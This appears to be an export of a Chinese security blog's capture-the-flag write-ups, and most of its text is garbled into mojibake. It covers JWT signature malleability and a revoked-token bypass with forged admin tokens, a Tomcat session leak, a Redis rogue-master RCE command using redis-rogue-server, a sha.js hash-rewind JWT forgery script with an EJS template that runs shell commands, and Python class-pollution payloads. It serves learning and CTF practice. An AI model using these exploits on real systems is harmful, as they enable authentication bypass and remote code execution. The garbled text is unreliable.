¼å¼ä»¥ä¾¿åœ¨ JSON æˆ– HTTP ä¸­ä¼ è¾“çš„ç¼–ç æ–¹å¼ã€‚åªè¦è§£ç å™¨ä»ä¿®æ”¹åçš„ Base64 å­—ç¬¦ä¸²ä¸­å¾—åˆ°äº†å®Œå…¨ç›¸åŒçš„åŸå§‹å­—èŠ‚æ•°ç»„ï¼ŒéªŒè¯å°±ä¼šé€šè¿‡ã€‚2. Base64 å­˜åœ¨â€œå†—ä½™â€å­—ç¬¦ (å¡«å……/ä¸å…³å¿ƒä½)Base64 å°† 3 ä¸ªå­—èŠ‚ç¼–ç æˆ 4 ä¸ªå­—ç¬¦ã€‚ å½“åŸå§‹ç­¾åé•¿åº¦ä¸æ˜¯ 3 çš„å€æ•°æ—¶ï¼ˆè¿™æ˜¯ RSA ç­¾åç­‰å¸¸è§æƒ…å†µï¼‰ï¼Œæœ€åä¸€ä¸ª Base64 å—æ˜¯ä¸å®Œæ•´çš„ã€‚åœ¨è¿™ä¸ªä¸å®Œæ•´çš„å—ä¸­ï¼Œæœ€åä¸€ä¸ªï¼ˆæˆ–å€’æ•°ç¬¬äºŒä¸ªï¼‰Base64 å­—ç¬¦çš„éƒ¨åˆ†ä½ä¸ä»£è¡¨åŸå§‹æ•°æ®ï¼Œè€Œæ˜¯å¡«å……æˆ–â€œä¸å…³å¿ƒâ€ï¼ˆdont careï¼‰çš„å€¼ã€‚æ‚¨å¯ä»¥æ›´æ”¹è¿™ä¸ªå­—ç¬¦ï¼Œåªè¦æ›´æ”¹åçš„å­—ç¬¦ä»ç„¶ä¿æŒé‚£äº›â€œä¸å…³å¿ƒâ€ä½ï¼Œè€Œä¸å½±å“é‚£äº›é‡è¦çš„ã€ä»£è¡¨åŸå§‹ç­¾åçš„ä½ã€‚ç»“æœï¼š ä¸åŒçš„ Base64 å­—ç¬¦ä¸²å¯ä»¥è§£ç å‡ºç›¸åŒçš„åŸå§‹å­—èŠ‚æ•°ç»„ã€‚ç¤ºä¾‹ï¼š æ›´æ”¹ä¸€ä¸ªå­—ç¬¦ä¸ºå¦ä¸€ä¸ªå…·æœ‰ç›¸åŒå‰ä¸¤ä½ï¼ˆæœ‰æ•ˆæ•°æ®ä½ï¼‰çš„å­—ç¬¦ï¼ˆä¾‹å¦‚ A æ”¹ä¸º Pï¼‰ï¼Œä¸ä¼šæ”¹å˜è§£ç åçš„ç­¾åã€‚ å¾—åˆ°çš„adminçš„jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDY2NjY4NS4zMjk5MTgxfQ.T_VUBWxtF0krNyTFYX7mgteeTfGcgqh-jVuhs8VMunY å€¼ (åè¿›åˆ¶) 6 ä½ (äºŒè¿›åˆ¶) æœ‰æ•ˆä½ (å‰ 4 ä½) æœ€åä¸€ä¸ª 2 ä½ (ä¸å…³å¿ƒ) Base64URL å­—ç¬¦ 24 $011000_2$ $0110_2$ $00_2$ Y 25 $011001_2$ $0110_2$ $01_2$ Z 26 $011010_2$ $0110_2$ $10_2$ a 27 $011011_2$ $0110_2$ $11_2$ b æ”¹ä¸º eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDY2NjY4NS4zMjk5MTgxfQ.T_VUBWxtF0krNyTFYX7mgteeTfGcgqh-jVuhs8VMunZ solution2è¿™é‡Œæ˜¯å› ä¸ºå¤„ç†è¾“å…¥çš„JWTæ—¶ï¼Œå¯¹å­—ç¬¦ä¸²å½¢å¼å’Œè§£ç å­—èŠ‚å½¢å¼çš„å¤„ç†ä¸ä¸€è‡´ è¿™é‡Œæˆ‘ä»¬ç»™æˆ‘ä»¬å¾—åˆ°çš„jwtæœ«å°¾åŠ ä¸€ä¸ª=å°±å¯ä»¥ç»•è¿‡revoked_tokensçš„ç»•è¿‡ å› ä¸ºè¿™é‡Œåˆ¤æ–­æ˜¯ä¸æ˜¯revoked_tokenæ˜¯å’Œæ•°æ®åº“é‡Œçš„revoked_tokenå­—ç¬¦ä¸²æ¯”è¾ƒ æˆ‘ä»¬åŠ ä¸€ä¸ª=å¡«å……å¯ä»¥ç»•è¿‡è¿™ä¸ªæ¯”è¾ƒå¹¶ä¸”è¢«è§£ææˆæ­£ç¡®çš„jwt å¾—åˆ° eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDY2NjY4NS4zMjk5MTgxfQ.T_VUBWxtF0krNyTFYX7mgteeTfGcgqh-jVuhs8VMunY æ”¹ä¸º eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc2NDY2NjY4NS4zMjk5MTgxfQ.T_VUBWxtF0krNyTFYX7mgteeTfGcgqh-jVuhs8VMunY= Tomwhatè¿›å»å°±æ˜¯tomwahtçš„é¢æ¿ è™½ç„¶æˆ‘ä»¬ä¸çŸ¥é“å¸å·å¯†ç  run.shé‡Œé¢ä¹Ÿå†™äº† files=$(grep -Rl RemoteCIDRValve $CATALINA_HOME/conf $CATALINA_HOME/webapps || true) \\ for f in $files; do \\ sed -i s/allow=127.0.0.0\\/8,::1\\/128/allow=0.0.0.0\\/0,::\\/0/ $f; \\ done è¿™é“é¢˜è€ƒç‚¹æ˜¯tomwhaté¢æ¿å¯ä»¥æ³„éœ²sessionå¹¶ä¸”è¿™é‡Œä¸‰ä¸ªè·¯ç”±æ—¶å…±äº«sessionä¼šè¯æ•°æ®çš„ adminè¦æ±‚usernameä¸ºdarth_sidious ä½†æ˜¯lightè·¯ç”±ä¸¥ç¦è¾“å…¥darth_sidious é‚£ä¹ˆè¿™æ ·å°±å¯ä»¥åˆšåˆšæˆ‘è¯´çš„é¢æ¿å¯ä»¥æ³„éœ²sessionå¹¶ä¸”è¿™é‡Œä¸‰ä¸ªè·¯ç”±æ—¶å…±äº«sessionä¼šè¯æ•°æ®çš„ç‚¹ å‚è€ƒæ–‡ç« https://www.freebuf.com/articles/web/247253.html examplesservletsservletSessionExample å¯ä»¥ç”Ÿæˆæ ¹ç›®å½•çš„session è¿™æ ·å°±å¯ä»¥å¾—åˆ°usernameä¸ºdarth_sidious çš„ä¼šè¯æ•°æ® ç›´æ¥è®¿é—®darkadmin å°±å¯ä»¥çœ‹åˆ°flagäº†","tags":["CTF-wp"]},{"title":"Redisä¸»ä»å¤åˆ¶RCE","path":"/2025/11/14/Redisä¸»ä»å¤åˆ¶RCE/","content":"Redisä¸»ä»å¤åˆ¶RCEæ¦‚å¿µRedisæ˜¯ç°åœ¨æœ€å—æ¬¢è¿çš„NoSQLæ•°æ®åº“ä¹‹ä¸€ï¼ŒRedisæ˜¯ä¸€ä¸ªä½¿ç”¨ANSI C(å°±æ˜¯cå•¦)ç¼–å†™çš„å¼€æºã€åŒ…å«å¤šç§æ•°æ®ç»“æ„ã€æ”¯æŒç½‘ç»œã€åŸºäºå†…å­˜ã€å¯é€‰æŒä¹…æ€§çš„é”®å€¼å¯¹å­˜å‚¨æ•°æ®åº“ã€‚ä»–æ¯”mysqlå¿«å¾—å¤šã€‚ Redis ä¸»ä»å¤åˆ¶ï¼Œå°±æ˜¯æŒ‡å°†ä¸€ä¸ª Redis æœåŠ¡å™¨ï¼ˆç§°ä¸º ä¸»èŠ‚ç‚¹ï¼‰çš„æ•°æ®ï¼Œå¤åˆ¶åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªå…¶ä»– Redis æœåŠ¡å™¨ï¼ˆç§°ä¸º ä»èŠ‚ç‚¹ï¼‰çš„è¿‡ç¨‹ã€‚ â€‹\tÂ·ä¸»èŠ‚ç‚¹:é€šå¸¸è´Ÿè´£å†™æ“ä½œï¼Œæ‰€æœ‰å®¢æˆ·ç«¯çš„è¯·æ±‚éƒ½å‘é€åˆ°ä¸»æœåŠ¡å™¨ã€‚ â€‹\tÂ·ä»èŠ‚ç‚¹:é€šå¸¸è´Ÿè´£è¯»æ“ä½œï¼Œå®ƒä»¬ä¼šç²¾ç¡®åœ°å¤åˆ¶ä¸»èŠ‚ç‚¹çš„æ•°æ®ï¼Œå®¢æˆ·ç«¯å¯ä»¥å°†è¯»è¯·æ±‚å‘é€åˆ°ä»èŠ‚ç‚¹ï¼Œä»¥åˆ†æ‹…ä¸»èŠ‚ç‚¹çš„å‹åŠ›ã€‚ slaveå‘masterå‘é€PSYNCå‘½ä»¤å¾—åˆ°çš„å›åº”åˆ†ç±»: a) å…¨é‡åŒæ­¥(+FULLRESYNC) ä¼šå°†masterä¸Šçš„RDBæ–‡ä»¶åŒæ­¥åˆ°slaveä¸Š b) å¢é‡åŒæ­¥(+CONTINUE) slaveå‘masterè¦æ±‚æ•°æ®åŒæ­¥ï¼Œä¼šå‘é€masterçš„runidå’Œoffestï¼Œå¦‚æœrunidå’Œslaveä¸Šçš„ä¸å¯¹åº”åˆ™ä¼šè¿›è¡Œå…¨é‡å¤åˆ¶ï¼Œå¦‚æœç›¸åŒåˆ™è¿›è¡Œæ•°æ®åŒæ­¥ï¼Œä½†æ˜¯ä¸ä¼šä¼ è¾“RDBæ–‡ä»¶ ç‰¹ç‚¹:å•å‘æ“ä½œï¼Œåªèƒ½ä»ä¸»èŠ‚ç‚¹å¤åˆ¶åˆ°ä»èŠ‚ç‚¹ æ¼æ´æˆå› redisä»4.0ç‰ˆæœ¬å¼€å§‹å°±å…è®¸ç”¨æˆ·è‡ªå®šä¹‰åŠ è½½æ¨¡å—(redis module)ï¼Œé€šè¿‡æ¨¡å—å¯ä»¥åˆ›å»ºæ–°çš„å‘½ä»¤ã€æ•°æ®ç±»å‹ã€å‡½æ•°ç­‰ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ è½½è‡ªå·±ç”Ÿæˆçš„æ¶æ„æ¨¡å—(soæ–‡ä»¶)ä»è€Œå¯ä»¥å®ç°åœ¨ redis ä¸­å®ç°ä¸€ä¸ªæ–°çš„ Redis å‘½ä»¤ï¼Œä»è€Œæ¥è¿›è¡ŒRCEã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯å…¨é‡åŒæ­¥ã€‚ è¿™é‡Œä¸ºä»€ä¹ˆè¦ç”¨åˆ°ä¸»ä»å¤åˆ¶è¿™ä¸ªåŸç†å°±æ˜¯å› ä¸º Redisçš„å‘½ä»¤é›†é™åˆ¶äº†æˆ‘ä»¬ã€‚è€Œä¸»ä»å¤åˆ¶æ”»å‡»ï¼Œè¡¨é¢ä¸Šæ˜¯â€œå¯¹ä¸»èŠ‚ç‚¹è¿›è¡Œæ“ä½œâ€ï¼ˆè®©ç›®æ ‡ä½œä¸ºä»èŠ‚ç‚¹å»è¿æ¥æˆ‘ä»¬æ§åˆ¶çš„ä¸»èŠ‚ç‚¹ï¼‰ï¼Œå®è´¨ä¸Šæ˜¯åˆ©ç”¨ä¸»ä»å¤åˆ¶è¿™ä¸ªåˆæ³•é€šé“ï¼Œå°†æ¶æ„æ¨¡å—ä»å¤–éƒ¨é€å…¥å†…éƒ¨ï¼Œæœ€ç»ˆè¾¾åˆ°åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»£ç çš„ç›®çš„ã€‚ rediså¸¸ç”¨å‘½ä»¤ set xz Hacker # è®¾ç½®é”®xzçš„å€¼ä¸ºå­—ç¬¦ä¸²Hackerget xz # è·å–é”®xzçš„å†…å®¹SET score 857 # è®¾ç½®é”®scoreçš„å€¼ä¸º857INCR score # ä½¿ç”¨INCRå‘½ä»¤å°†scoreçš„å€¼å¢åŠ 1GET score # è·å–é”®scoreçš„å†…å®¹keys * # åˆ—å‡ºå½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰çš„é”®config set protected-mode no # å…³é—­å®‰å…¨æ¨¡å¼get anotherkey # è·å–ä¸€ä¸ªä¸å­˜åœ¨çš„é”®çš„å€¼config set dir /root/redis # è®¾ç½®ä¿å­˜ç›®å½•config set dbfilename redis.rdb # è®¾ç½®ä¿å­˜æ–‡ä»¶åconfig get dir # æŸ¥çœ‹ä¿å­˜ç›®å½•config get dbfilename # æŸ¥çœ‹ä¿å­˜æ–‡ä»¶åsave # è¿›è¡Œä¸€æ¬¡å¤‡ä»½æ“ä½œflushall # åˆ é™¤æ‰€æœ‰æ•°æ®del key # åˆ é™¤é”®ä¸ºkeyçš„æ•°æ®slaveof ip port # è®¾ç½®ä¸»ä»å…³ç³»redis-cli -h ip -p 6379 -a passwd # å¤–éƒ¨è¿æ¥ æ¼æ´åˆ©ç”¨æ¡ä»¶redisç‰ˆæœ¬ 4.xã€5.x æ¼æ´å¤ç°å·¥å…·:https://github.com/n0b0dyCN/redis-rogue-server ç¯å¢ƒæ­å»º docker pull damonevking/redis5.0docker run -p 6379:6379 -d damonevking/redis5.0 redis-server å·¥å…·ä½¿ç”¨ python3 redis-rogue-server.py --rhost 192.168.137.129 --lhost 192.168.137.129 --exp=exp.so","tags":["CTFå­¦ä¹ "]},{"title":"N1CTF2025-eezzjs","path":"/2025/11/11/[2025]N1CTF WP/","content":"[2025]N1CTF WPeezzjsè¿™é“é¢˜éš¾ç‚¹åœ¨äºå‰åŠéƒ¨åˆ†é‰´æƒ ååŠéƒ¨åˆ†åœ¨ycbäº¦æœ‰è®°è½½ ä½¿ç”¨.ç»•è¿‡å¯¹jsåç¼€çš„ç»•è¿‡ æ€è·¯æœ‰æºç ï¼Œapp.jså°±å‘Šè¯‰æˆ‘ä»¬æœ‰ä¸€ä¸ªç™»å½•è·¯ç”±å¿…é¡»ä»¥adminç™»å½•ï¼Œå…·ä½“æ ¡éªŒæ–¹å¼æ˜¯jwt ä»¥adminèº«ä»½ç™»é™†è¿›å»åå¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œfunction serveIndexä¼šæ¸²æŸ“æˆ‘ä»¬çš„ejsæ–‡ä»¶ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ä¸Šä¼ æ¶æ„çš„ejsæ¨¡æ¿æ–‡ä»¶ï¼Œä»è€Œæ¥æ‰§è¡Œå‘½ä»¤ã€‚ é‰´æƒè¿™ä¸€æ­¥ä½ è‡ªå·±æœ¬åœ°æ‹¿é™„ä»¶npm installçš„æ—¶å€™ ä»–å°±ä¼šæé†’ä½ sha.jsè¿™ä¸ªç»„ä»¶å­˜åœ¨æ¼æ´ã€‚ è”ç½‘æœç´¢æœåˆ°å¾ˆæœ‰ç‰¹å¾CVE-2025-9288 https://www.freebuf.com/articles/web/445352.html https://github.com/advisories/GHSA-95m3-7q98-8xr5 è¿™é‡Œå°±å¼•å‡ºäº†ä¸€ä¸ªå¾ˆæ–°å¥‡çš„æ¦‚å¿µ:å“ˆå¸Œå›æ»š å“ˆå¸Œå›æ»š å“ˆå¸Œè®¡ç®—è¿‡ç¨‹ä¸­çŠ¶æ€æ„å¤–åœ°å›åˆ°äº†ä¹‹å‰çš„æŸä¸ªç‚¹ï¼Œä½¿å¾—åç»­è®¡ç®—æ€»æ˜¯ä»ç›¸åŒçŠ¶æ€å¼€å§‹ï¼Œäº§ç”Ÿå›ºå®šç»“æœã€‚ æ¼æ´éªŒè¯ const forgeHash = (data, payload) = JSON.stringify([payload, length: -payload.length, [...data]])const sha = require(sha.js)const randomBytes = require(crypto)const sha256 = (...messages) = const hash = sha(sha256) messages.forEach((m) = hash.update(m)) return hash.digest(hex)const validMessage = [randomBytes(32), randomBytes(32), randomBytes(32)] // whateverconst payload = forgeHash(Buffer.concat(validMessage), Hashed input means safe)const receivedMessage = JSON.parse(payload) // e.g. over network, whateverconsole.log(sha256(...validMessage))console.log(sha256(...receivedMessage))console.log(receivedMessage[0]) ç­‰ä»· require(sha.js)(sha256).update(foo).digest(hex)2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae require(sha.js)(sha256).update(fooabc).update(length:-3).digest(hex)2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae å›åˆ°æˆ‘ä»¬è¿™ä¸ªé¢˜ç›®å½“ä¸­æ¥ æˆ‘ä»¬çš„jwtçš„haederå’Œbodyéƒ½æ˜¯è§£å¯†tokenæ¥è·å–ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™ä¸ªjwtæ ¼å¼é‡Œçš„lengthæ˜¯å¯æ§çš„ const verifyJWT = (token, secret = JWT_SECRET) = if (typeof token !== string) return null; const parts = token.split(.); if (parts.length !== 3) return null; const [encodedHeader, encodedPayload, signature] = parts; let header; let payload; try header = JSON.parse(fromBase64Url(encodedHeader).toString()); payload = JSON.parse(fromBase64Url(encodedPayload).toString()); catch (err) return null; åŸç†å°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶jwté‡Œé¢çš„lengthç±»æ§åˆ¶è¿™é‡Œçš„å˜é‡ï¼Œè¿™é‡Œlengthæ˜¯header+secretçš„é•¿åº¦ ä¸‹é¢æ˜¯ç”Ÿæˆä¼ªé€ admin seesionè„šæœ¬ æ”¾åœ¨srcç›®å½•è¿è¡Œ const signJWT, verifyJWT = require(./auth);const crypto = require(crypto);const header = alg: HS256, typ: JWT ;const len = -(JSON.stringify(header).length + 18);//å…³é”®ä¸€æ­¥token = signJWT(username:admin, length: len, crypto.randomBytes(9).toString(hex))console.log(token)console.log(verifyJWT(token, crypto.randomBytes(9).toString(hex))) æ‹¿åˆ°sessionè¿›å…¥upload å°±è¡Œ æ¶æ„ejsä¸Šä¼ è¿™é‡Œåé¢å°±æ˜¯å¯ä»¥ä¸Šä¼ ejsæ–‡ä»¶ ä½¿ç”¨.ç»•è¿‡å°±å¯ä»¥äº† ejså†…å®¹æ˜¯ %= global.process.mainModule.require(child_process).execSync(cat /flag).toString() % è¿™é‡Œå”¯ä¸€è¦æ³¨æ„çš„ç‚¹å°±æ˜¯éœ€è¦è¿›è¡Œç›®å½•ç©¿è¶Š ç„¶å","tags":["CTF-wp"]},{"title":"æµ…è°ˆpythonåŸå‹é“¾æ±¡æŸ“","path":"/2025/11/06/pythonåŸå‹é“¾æ±¡æŸ“/","content":"å‰è¨€pythonåŸå‹é“¾æ±¡æŸ“æ²¡ç³»ç»Ÿå­¦è¿‡ï¼Œé‡åˆ°è¦ä¹ˆæ˜¯æ¯”è¾ƒç®€å•ä¸€æŠŠè¿‡ï¼Œè¦ä¹ˆå°±æ˜¯å¾ˆéš¾ä¸ä¼šï¼Œä½†æ˜¯è¿˜æ˜¯å†³å®šæ¥è¡¥ä¸€è¡¥å‘(^_^) STUDYæ¦‚å¿µpythonåŸå‹é“¾æ±¡æŸ“å’ŒjsåŸå‹é“¾æ±¡æŸ“çš„ç›®çš„å·®ä¸å¤šï¼Œä½†æ˜¯åŸç†æœºåˆ¶å¾ˆä¸åŒï¼Œjsæ˜¯é€šè¿‡jsçš„è¿­ä»£ç‰¹æ€§ä½¿ç”¨__proto__Prototypeï¼Œpythonæ˜¯æ±¡æŸ“ç±»å±æ€§å€¼ã€‚ Python å¯¹è±¡é€šè¿‡ __class__ æŒ‡å‘ç±»ï¼Œç±»é€šè¿‡ __bases__ æŒ‡å‘çˆ¶ç±»ï¼›å±æ€§æŸ¥æ‰¾ä¼šæ ¹æ® MROï¼ˆæ–¹æ³•è§£æé¡ºåºï¼‰æ²¿ç±»ç»§æ‰¿é“¾å‘ä¸ŠæŸ¥æ‰¾ã€‚ Nodejsæ˜¯å¯¹é”®å€¼å¯¹çš„æ§åˆ¶æ¥è¿›è¡Œæ±¡æŸ“ï¼Œè€ŒPythonåˆ™æ˜¯å¯¹ç±»å±æ€§å€¼çš„æ±¡æŸ“ï¼Œä¸”åªèƒ½å¯¹ç±»çš„å±æ€§æ¥è¿›è¡Œæ±¡æŸ“ä¸èƒ½å¤Ÿæ±¡æŸ“ç±»çš„æ–¹æ³•ã€‚ å’ŒjsåŸå‹é“¾æ±¡æŸ“ä¸€æ ·ï¼Œéœ€è¦ä¸€ä¸ªmergeæ“ä½œæˆ–è€…è¯´éœ€è¦ä¸€ä¸ªå‡½æ•°è¿›è¡Œåˆå¹¶è¿™æ ·æˆ‘ä»¬æ‰èƒ½è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬çœ‹åˆ°mergeç›¸å…³æ“ä½œæˆ‘ä»¬å°±å¯ä»¥è”æƒ³åŸå‹é“¾æ±¡æŸ“ã€‚ æ±¡æŸ“è¿‡ç¨‹å¸¸è§mergeå‡½æ•°é•¿è¿™ä¸ªæ ·å­ def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, __getitem__): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) å…¶å®è¿™ä¸ªå‡½æ•°æŒºç»•çš„ è°ƒè¯•ä»£ç å¦‚ä¸‹: **é€šè¿‡å¯¹srcçš„æ§åˆ¶ï¼Œæ¥æ§åˆ¶dstçš„å€¼ï¼Œæ¥è¾¾åˆ°æˆ‘ä»¬æ±¡æŸ“çš„ ** å®Œæˆdst.kvçš„æ±¡æŸ“ class father: secret = helloclass son_a(father): passclass son_b(father): passdef merge(src, dst): for k, v in src.items(): if hasattr(dst, __getitem__): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = son_b()payload = __class__ : __base__ : secret : world print(son_a.secret)print(instance.secret)merge(payload, instance)print(son_a.secret)print(instance.secret) è·Ÿç€åˆ«äººåšå®¢è°ƒè¯•å¤§æ¦‚å°±æ‡‚è¿™ä¸ªè¿‡ç¨‹äº† åˆšè¿›å…¥forå¾ªç¯ dstå€¼è¿˜æ˜¯son_b() srcæ˜¯__class__ : __base__ : secret : world ç»è¿‡äº†merge(v, getattr(dst, k))å dstå˜ä¸ºäº†son_b.__class__ åœ¨ç»è¿‡ä¸€æ¬¡merge(v, getattr(dst, k)) dstå˜ä¸ºäº†fatherç±»ä¹Ÿå°±æ˜¯son_b.__class__.__base__ ç„¶åå› ä¸ºvä¸æ˜¯å­—å…¸è€Œæ˜¯world äºæ˜¯è¿›å…¥äº†è¿™ä¸ªelseåˆ†æ”¯ setattr(dst, k, v) æ­¤æ—¶ dstä¸ºson_b.__class__.__base__ä¹Ÿå°±æ˜¯fatherç±» kä¸ºsecret v ä¸ºworld é‚£ä¹ˆå°±æˆåŠŸæ±¡æŸ“fatherç±»çš„secretå±æ€§ï¼Œå°†å…¶ä»helloæ±¡æŸ“æˆäº†world è‡ªç„¶son_b()ä½œä¸ºfatherçš„å­ç±»åŒæ ·æ”¶åˆ°å½±å“ã€‚è¿™å°±æ˜¯æ±¡æŸ“çš„å…·ä½“æµç¨‹ï¼Œè‡ªå·±è·Ÿç€è°ƒè¯•ä¸€éä¼šå¾ˆæ¸…æ™°ã€‚æˆ‘è‡ªå·±ç†è§£å°±æ˜¯æ±¡æŸ“instance.__class__.__base__ä¹Ÿå°±æ˜¯ä»£ç é‡Œçš„fatherç±»çš„secretå±æ€§ï¼ŒæŠŠå®ƒçš„å€¼å˜ä¸ºworldã€‚ ï¼æ³¨æ„ä¸Šè¿°æˆ‘ä»¬æ±¡æŸ“çš„æ˜¯secretå±æ€§ï¼Œå¹¶ä¸æ˜¯ä»€ä¹ˆéƒ½èƒ½è¢«æ±¡æŸ“ï¼Œobjectç±»å°±ä¸è¡Œã€‚ è€Œä¸”æˆ‘ä»¬æ±¡æŸ“çš„æ˜¯fatherç±»secretå±æ€§å¹¶ä¸æ˜¯son_b()çš„ï¼Œfatheræ˜¯son_b()çš„çˆ¶ç±»ï¼Œfatherç±»å—åˆ°å½±å“ï¼Œsob_b()éšä¹‹ä¹Ÿä¼šå—åˆ°å½±å“ã€‚ æ‰‹æ³•æ€»ç»“__base__è·å–ç›®æ ‡ç±»ï¼šåˆšåˆšè°ƒè¯•çš„ä»£ç å°±æ˜¯é€šè¿‡__base__æ¥è·å–çˆ¶ç±»(è°ƒè¯•ä»£ç é‡Œçš„fatherç±»)ï¼Œä½†æ˜¯å¦‚æœå’Œçˆ¶å­ç±»æ²¡æœ‰å…³ç³»æˆ‘ä»¬åº”è¯¥æ€ä¹ˆåŠå‘¢?æ¥ä¸‹æ¥ä¼šç»™ä¸€äº›å…¶ä»–çš„åˆ©ç”¨æ–¹å¼ __init__è·å–å…¨å±€å˜é‡åŸç†: é€šè¿‡æ±¡æŸ“å‡½æ•°ï¼ˆå¦‚ __init__ï¼‰çš„ __globals__ å±æ€§ï¼Œä»è€Œé—´æ¥ä¿®æ”¹å…¨å±€å‘½åç©ºé—´ä¸­çš„å˜é‡æˆ–ç±»å±æ€§ï¼Œå¯¼è‡´ä»»æ„å¯¹è±¡è¢«æ±¡æŸ“ã€‚ a=1def demo(): passclass A : def __init__(self): passprint(demo.__globals__==globals()==A.__init__.__globals__)#è¾“å‡ºTrue ç¤ºä¾‹ä»£ç  a = 1def merge(src, dst): for k, v in src.items(): if hasattr(dst, __getitem__): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)def demo(): passclass A: def __init__(self): passclass B: classa = 2instance = A()payload = __init__: __globals__: a:4, B: classa:5 print(B.classa)print(a)merge(payload, instance)print(B.classa)print(a) ä»¿ç…§ä¸Šé¢çš„è°ƒè¯•ä½ ä¹Ÿå¯ä»¥è¯¦ç»†çœ‹åˆ°è¿™ä¸ªæ±¡æŸ“çš„è¿‡ç¨‹ã€‚ æœ€å¼€å§‹dstæ˜¯A() ç»è¿‡mergeåå˜æˆäº† A.__init ç„¶åå†ç»è¿‡ä¸€æ¬¡mergeå˜æˆäº† A.__class__.init.__globals__çœ‹åˆ°äº†å…¨å±€å˜é‡ ç„¶åå› ä¸ºdstå½“å‰æ˜¯å­—å…¸ï¼Œå› ä¸ºä¸æ»¡è¶³if dst.get(k) and type(v) == dict:è¿›å…¥elseåˆ†æ”¯ å°†dstå³å…¨å±€å˜é‡é‡Œçš„aèµ‹å€¼ä¸ºäº†4 vå˜æˆå­—å…¸classa:5 æ¥ä¸‹æ¥å› ä¸ºæ»¡è¶³ifåˆ†æ”¯ ä»£ç è¿è¡Œåˆ°merge(v, dst.get(k)) æ­¤æ—¶ merge(v, dst.get(k)) ç„¶åsrcvï¼ŒdstB() ç»è¿‡åˆ¤æ–­ç›´æ¥è¿›å…¥äº†setattr(dst, k, v) äºæ˜¯å°±æŠŠBé‡Œçš„classaçš„å±æ€§æˆåŠŸæ±¡æŸ“æˆäº†5 è·å–å…¶ä»–æ¨¡å—:åœ¨å…¨å±€å˜é‡çš„å‰æä¸‹ï¼Œæ˜¯æˆ‘ä»¬éƒ½åœ¨å…¥å£æ–‡ä»¶ä¸­çš„ç±»å¯¹è±¡æˆ–è€…å±æ€§æ¥è¿›è¡Œæ“ä½œçš„ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æ“ä½œçš„ä½ç½®åœ¨å…¥å£æ–‡ä»¶ä¸­ï¼Œè€Œç›®æ ‡å¯¹è±¡å¹¶ä¸åœ¨å…¥å£æ–‡ä»¶å½“ä¸­ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦å¯¹å…¶ä»–åŠ è½½è¿‡çš„æ¨¡å—æ¥è·å–äº† importï¼šåœ¨ç®€å•çš„å…³ç³»æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡importæ¥è¿›è¡ŒåŠ è½½ï¼Œåœ¨payloadä¸­æˆ‘ä»¬åªéœ€è¦å¯¹å¯¹åº”çš„æ¨¡å—é‡æ–°å®šä½å°±å¯ä»¥ï¼š import demopayload = __init__: __globals__: demo: a:4, B: classa:5 ##demo.pya = 1class B: classa = 2 sysï¼šåœ¨å¾ˆå¤šç¯å¢ƒå½“ä¸­ï¼Œä¼šå¼•ç”¨ç¬¬ä¸‰æ–¹æ¨¡å—æˆ–è€…æ˜¯å†…ç½®æ¨¡å—ï¼Œè€Œä¸æ˜¯ç®€å•çš„importåŒçº§æ–‡ä»¶ä¸‹é¢çš„ç›®å½•ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦å€ŸåŠ©sysæ¨¡å—ä¸­çš„moduleå±æ€§ï¼Œè¿™ä¸ªå±æ€§èƒ½å¤ŸåŠ è½½å‡ºæ¥åœ¨è‡ªè¿è¡Œå¼€å§‹æ‰€æœ‰å·²åŠ è½½çš„æ¨¡å—ï¼Œä»è€Œæˆ‘ä»¬èƒ½å¤Ÿä»å±æ€§ä¸­è·å–åˆ°æˆ‘ä»¬æƒ³è¦æ±¡æŸ“çš„ç›®æ ‡æ¨¡å— import syspayload = __init__: __globals__: sys: modules: demo: a:4, B: classa:5 loaderï¼šé€šè¿‡loader.__init__.__globals__[sys]æ¥è·å–åˆ°sysæ¨¡å—ï¼Œç„¶åå†è·å–åˆ°æˆ‘ä»¬æƒ³è¦çš„æ¨¡å—ï¼ŒloaderåŠ è½½å™¨åœ¨pythonä¸­çš„ä½œç”¨æ˜¯å®ç°æ¨¡å—åŠ 